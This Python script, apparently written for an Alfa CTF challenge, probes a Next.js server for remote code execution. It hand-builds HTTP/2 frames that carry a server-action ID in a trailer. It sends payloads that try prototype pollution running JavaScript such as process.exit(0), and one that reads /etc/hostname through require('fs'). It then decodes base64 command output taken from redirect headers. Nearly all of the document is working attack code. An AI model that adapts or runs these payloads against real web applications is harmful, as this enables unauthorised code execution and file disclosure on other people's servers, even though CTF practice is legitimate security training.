#!/usr/bin/env python3
"""
Debug RCE - проверим разные способы выполнения команд
"""
import socket, ssl, struct, time, re, base64
from urllib.parse import unquote
from hpack import Encoder

HOST = 'funicular-gm2cxozn.alfactf.ru'
ACTION_ID = '4082c44f4a6a9cc400f0e6b45ed1c06c10f100aad2'

def send_payload_debug(payload_type, payload_data):
    """Отправить payload и получить детальный ответ"""
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    ctx.set_alpn_protocols(['h2'])

    raw = socket.create_connection((HOST, 443), timeout=15)
    sock = ctx.wrap_socket(raw, server_hostname=HOST)
    sock.sendall(b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n\x00\x00\x00\x04\x00\x00\x00\x00\x00")

    try:
        sock.settimeout(2)
        sock.recv(65536)
    except: pass
    sock.settimeout(15)

    enc = Encoder()
    headers = enc.encode([
        (":method", "POST"), (":scheme", "https"), (":authority", HOST), (":path", "/"),
        ("content-type", "text/plain;charset=UTF-8"),
        ("content-length", str(len(payload_data))),
        ("trailer", "next-action"),
        ("user-agent", f"debug-{payload_type}"),
    ])

    trailer = enc.encode([("next-action", ACTION_ID)])

    sid = 1
    sock.sendall(struct.pack(">I", len(headers))[1:] + b"\x01\x04" + struct.pack(">I", sid) + headers)
    sock.sendall(struct.pack(">I", len(payload_data))[1:] + b"\x00\x00" + struct.pack(">I", sid) + payload_data)
    sock.sendall(struct.pack(">I", len(trailer))[1:] + b"\x01\x05" + struct.pack(">I", sid) + trailer)

    headers_recv = {}
    body_recv = b""
    end_time = time.time() + 15

    while time.time() < end_time:
        try:
            hdr = sock.recv(9)
            if len(hdr) < 9: break
            length, frame_type, flags = struct.unpack(">I", b"\x00" + hdr[0:3])[0], hdr[3], hdr[4]
            stream_id = struct.unpack(">I", hdr[5:9])[0] & 0x7FFFFFFF

            payload = b""
            while len(payload) < length:
                chunk = sock.recv(length - len(payload))
                if not chunk: break
                payload += chunk

            if frame_type == 1:  # HEADERS
                for header_name in [b"x-action-redirect", b"location"]:
                    if header_name in payload:
                        try:
                            pattern = header_name + rb"[^\x00]*\x00([^\x00]+)"
                            match = re.search(pattern, payload)
                            if match:
                                headers_recv[header_name.decode()] = match.group(1).decode()
                        except: pass
            elif frame_type == 0: body_recv += payload

            if stream_id == sid and (flags & 1): break
        except: break

    sock.close()
    return headers_recv, body_recv

def main():
    print("🔍 Debug RCE - Testing different approaches")

    tests = [
        # Test 1: Baseline action
        ("baseline", '["$K1"]'),

        # Test 2: Simple JavaScript execution test
        ("js-test", '["$K1", {"__proto__": {"then": "console.log(\\"test\\")"}}]'),

        # Test 3: Try to cause visible error
        ("error-test", '["$K1", {"__proto__": {"constructor": "undefined_function()"}}]'),

        # Test 4: Simple RCE attempt
        ("simple-rce", '["$K1", {"__proto__": {"constructor": "process.exit(0)"}}]'),

        # Test 5: File system access test
        ("fs-test", '["$K1", {"test": "require(\\"fs\\").readFileSync(\\"/etc/hostname\\", \\"utf8\\")"}}]'),
    ]

    for test_name, payload in tests:
        print(f"\n[+] Testing {test_name}: {payload}")

        try:
            headers, body = send_payload_debug(test_name, payload.encode())
            body_str = body.decode('utf-8', errors='ignore')

            # Check for any changes
            print(f"    Headers: {headers}")
            print(f"    Body size: {len(body)} bytes")

            # Look for digest
            if "digest" in body_str:
                digest_match = re.search(r"digest\":\"([^\"]+)", body_str)
                if digest_match:
                    digest = digest_match.group(1)
                    print(f"    Digest: {digest}")

            # Look for error indicators
            if "error" in body_str:
                print(f"    Error found: {body_str}")

            # Look for any flag
            if "alfa{" in body_str.lower():
                flag_match = re.search(r"alfa\{[^}]+\}", body_str, re.IGNORECASE)
                if flag_match:
                    print(f"    🎉 FLAG: {flag_match.group(0)}")

            # Check for redirect headers
            for header_name in ["x-action-redirect", "location"]:
                if header_name in headers:
                    header_val = headers[header_name]
                    print(f"    {header_name}: {header_val}")

                    match = re.search(r"/login\?a=([^;&]+)", header_val)
                    if match:
                        try:
                            result_b64 = unquote(match.group(1))
                            result = base64.b64decode(result_b64).decode("utf-8", errors="ignore")
                            print(f"    🎉 RCE RESULT: {result}")
                        except Exception as e:
                            print(f"    Decode error: {e}")

        except Exception as e:
            print(f"    ERROR: {e}")

    print("\n" + "="*60)
    print("Debug complete. Look for different digests or redirect headers.")

if __name__ == "__main__":
    main()